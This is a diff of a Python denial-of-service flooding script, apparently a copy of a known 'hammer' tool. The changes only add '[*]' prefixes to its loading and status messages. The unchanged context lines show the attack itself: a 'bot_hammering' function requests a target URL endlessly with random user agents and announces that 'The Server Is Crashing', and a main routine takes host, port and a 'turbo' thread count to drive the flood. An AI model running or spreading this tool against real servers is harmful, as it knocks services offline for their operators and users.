@@ -15,32 +15,32 @@ import sys
 
 	
 print (" ")
-print (''' \033[91m Loading , Please Wait . . . \033[0m''')
+print (''' \033[91m[*] Loading , Please Wait . . . \033[0m''')
 print (" ")
 time.sleep(5)
 def load():
-  print (''' \033[92m Loading: [                    ] 0% \033[0m''')
+  print (''' \033[92m [*] Loading : [                    ] 0% \033[0m''')
   time.sleep(2)
-  print (''' \033[94m Loading: [...                 ] 15% \033[0m''')
+  print (''' \033[94m [*] Loading : [...                 ] 15% \033[0m''')
   time.sleep(2)
-  print (''' \033[96m Loading: [......              ] 30% \033[0m''')
+  print (''' \033[96m [*] Loading : [......              ] 30% \033[0m''')
   time.sleep(2)
-  print (''' \033[97m Loading: [.........           ] 45% \033[0m''')
+  print (''' \033[97m [*] Loading : [.........           ] 45% \033[0m''')
   time.sleep(2)
-  print (''' \033[93m Loading: [............        ] 60% \033[0m''')
+  print (''' \033[93m [*] Loading : [............        ] 60% \033[0m''')
   time.sleep(2)
-  print (''' \033[95m Loading: [...............     ] 75% \033[0m''')
+  print (''' \033[95m [*] Loading : [...............     ] 75% \033[0m''')
   time.sleep(2)
-  print (''' \033[90m Loading: [..................  ] 90% \033[0m''')
+  print (''' \033[90m [*] Loading : [..................  ] 90% \033[0m''')
   time.sleep(2)
-  print (''' \033[99m Loading: [....................] 100% \033[0m''')
+  print (''' \033[99m [*] Loading : [....................] 100% \033[0m''')
   time.sleep(2)
 
 
 
 load()
 print (" ")
-print (''' \033[91m Starting . . . \033[0m''')
+print (''' \033[91m[*] Starting . . . \033[0m''')
 print (" ")
 time.sleep(5)
 sent = 0
@@ -71,7 +71,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mThe Server İs Crashing ✓\033[0m")
+			print("\033[94m[*] The Server İs Crashing ✓\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -171,7 +171,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease Wait...\033[0m")
+	print("\033[94m[*] Please Wait . . .\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
@@ -180,7 +180,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mCheck Server İp And Port\033[0m")
+		print("\033[91m[*] Check Server İp And Port\033[0m")
 		usage()
 	while True:
 		for i in range(int(thr)):
